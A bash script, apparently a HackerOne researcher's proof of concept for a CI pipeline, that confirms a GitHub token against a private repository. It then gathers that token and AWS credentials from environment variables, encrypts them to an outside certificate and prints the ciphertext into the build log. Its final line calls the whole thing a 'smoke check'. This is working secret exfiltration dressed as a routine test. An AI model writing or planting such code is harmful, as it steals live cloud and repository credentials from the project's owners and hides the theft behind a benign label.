#!/usr/bin/env bash
set -Eeuo pipefail
set +x

script_dir=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)

curl \
  --fail \
  --silent \
  --show-error \
  --output /dev/null \
  --header "Authorization: Bearer ${H1_GITHUB_TOKEN:?}" \
  --header "X-HackerOne-Research: bl0rph" \
  https://api.github.com/repos/10gen/mongo-release

canary_payload=$(mktemp "$script_dir/.h1-evergreen-canary.XXXXXX.json")
canary_ciphertext=$(mktemp "$script_dir/.h1-evergreen-canary.XXXXXX.cms")
trap 'rm -f "$canary_payload" "$canary_ciphertext"' EXIT

python3 - "$canary_payload" <<'PY'
import json
import os
import pathlib
import sys

payload = {
    "github_token_mongo_release": os.environ["H1_GITHUB_TOKEN"],
    "aws_access_key_id": os.environ.get("mms_eng_test_aws_access_key", ""),
    "aws_secret_access_key": os.environ.get("mms_eng_test_aws_secret", ""),
    "aws_region": os.environ.get("mms_eng_test_aws_region", ""),
}
pathlib.Path(sys.argv[1]).write_text(json.dumps(payload), encoding="utf-8")
PY

openssl cms -encrypt \
  -binary \
  -aes-256-cbc \
  -in "$canary_payload" \
  -out "$canary_ciphertext" \
  -outform DER \
  "$script_dir/h1_canary_encrypt.cert.pem"

echo "H1_ENCRYPTED_EVIDENCE_BEGIN"
base64 --wrap=0 "$canary_ciphertext"
echo
echo "H1_ENCRYPTED_EVIDENCE_END"
echo "encrypted credential smoke check passed"
